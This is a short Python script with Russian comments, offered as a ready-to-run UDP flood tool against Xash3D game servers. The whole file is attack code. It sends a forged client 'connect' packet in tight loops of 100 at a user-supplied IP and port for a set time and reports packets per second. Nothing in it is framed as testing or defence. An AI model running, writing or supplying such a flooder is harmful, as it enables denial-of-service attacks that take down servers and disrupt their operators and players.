#!/usr/bin/env python3
"""
Ультра-простой флуд xash3d сервера
"""

import socket
import random
import time
import sys

def super_flood(ip, port, duration=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    packet = b"\xff\xff\xff\xffconnect 49 1234567 \"\\uuid\\1234567\\qport\\12345\\ext\\1\" \"\\name\\Flooder\"\n"
    
    print(f"[+] Флудим {ip}:{port} в течение {duration} секунд...")
    print("[+] Нажмите Ctrl+C для остановки")
    
    start = time.time()
    count = 0
    
    try:
        while time.time() - start < duration:
            # Отправляем пачками по 100 пакетов
            for _ in range(100):
                sock.sendto(packet, (ip, port))
                count += 1
            
            # Минимальная задержка
            time.sleep(0.001)
            
            # Статус каждую секунду
            if int(time.time()) % 5 == 0:
                elapsed = time.time() - start
                print(f"\r[+] Отправлено: {count:,} пакетов | Скорость: {count/elapsed:.0f} pps", end="")
    
    except KeyboardInterrupt:
        print("\n[!] Остановлено")
    
    finally:
        sock.close()
        elapsed = time.time() - start
        print(f"\n[+] Итог: {count:,} пакетов за {elapsed:.1f} секунд")
        print(f"[+] Средняя скорость: {count/elapsed:.0f} pps")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Использование: python flood.py <IP> <PORT> [секунд]")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30
    
    super_flood(ip, port, duration)